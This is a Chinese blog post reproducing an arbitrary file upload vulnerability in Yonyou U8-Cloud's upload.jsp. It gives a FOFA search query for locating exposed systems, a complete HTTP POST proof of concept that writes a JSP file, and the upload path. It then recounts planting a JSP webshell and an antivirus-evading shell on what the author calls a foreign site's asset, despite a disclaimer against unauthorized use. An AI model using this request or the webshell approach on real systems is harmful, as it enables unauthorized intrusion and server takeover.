# 原创
：  漏洞复现--用友U8-Cloud upload.jsp任意文件上传

# 漏洞复现--用友U8-Cloud upload.jsp任意文件上传

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

U8 cloud集中于企业内部管理管控，管理规范，高效，协同，透明。通过云模式，低成本，快速部署，即租即用帮助企业免除硬软件投入的快速 搭建企业管理架构。通过云服务连接，业务模式、服务模式的经营创新。该产品upload.jsp存在任意文件上传漏洞

### 二：漏洞影响版本

用友U8-Cloud

### 三：网络空间测绘查询

fofa:<br/> `app="用友-U8-Cloud"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/7bef90df6311373bce61dd2d48f3ae39.jpeg"/>

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/8a7a58169a319c6b0d90f561d459d3d4.jpeg"/><br/> POC:

```

POST /linux/pages/upload.jsp HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=F0344BD3C6761D7E4CFDDD76960710B1.server; JSESSIONID=297190CC38DE8614285AD7DC95102AFB.server
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
filename: hack.jsp
Content-Length: 56


&lt;% out.println("The website has vulnerabilities!!");%&gt;

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/95148e7ea85a0ffb3b83e7e6987145fb.jpeg"/><br/> 上传路径在/linux/{filename}.jsp<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/27f2160919e58d61be63ed03e62beb60.jpeg"/>

### 五：漏洞利用

此处为国外网站资产，请勿非法利用！<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/d2c185147eba9c3eb97f2177f41eb1ee.jpeg"/><br/> 写入JSP马<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/91dcf83699e61cac19c8f9ba5453093b.jpeg"/><br/> 让杀了，尴尬了<br/> 上传免杀马直接getshell
